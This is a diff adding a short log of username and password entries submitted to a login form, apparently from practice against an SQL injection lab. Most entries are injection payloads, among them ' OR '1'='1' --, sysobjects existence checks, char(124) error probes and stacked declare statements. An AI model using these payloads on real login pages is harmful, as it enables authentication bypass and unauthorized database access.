@@ -1,0 +1,30 @@
+User Name: and user>0Password:1
+User Name:' and user>0 and ''='Password:2
+User Name:' and user>0 and ''='Password:2
+User Name: and user>0Password:2
+User Name: and user>0Password:
+User Name: and user>0Password:
+User Name: and user>0Password:33
+User Name: and user>0Password:33
+User Name: and user>0Password:s
+User Name: and user>0Password:s
+User Name: and user>0Password:2
+User Name: and user>0Password:2
+User Name: and user>0Password:2
+User Name:DumbPassword:Dumb
+User Name:DumbPassword:Dumb
+User Name:asdPassword:c
+User Name:"'" --Password:
+User Name:"'" and user user>0 and ''='Password:
+User Name:and exists (select * from sysobjects);-- Password:
+User Name:and exists (select * from sysobjects);-- Password:
+User Name:and char(124)%2Buser%2Bchar(124)=0Password:
+User Name:and char(124)%2Buser%2Bchar(124)=0Password:
+User Name: and user>0Password:222
+User Name:' and user>0 and ''='Password:2
+User Name:' and password>0 and ''='Password:
+User Name:' and password>0 and ''='Password:222
+User Name:;declare @d int;-- Password:22
+User Name:;declare @d int;-- Password:
+User Name:' OR '1'='1' --Password:2
+User Name:' OR '1'='1' /*Password:2
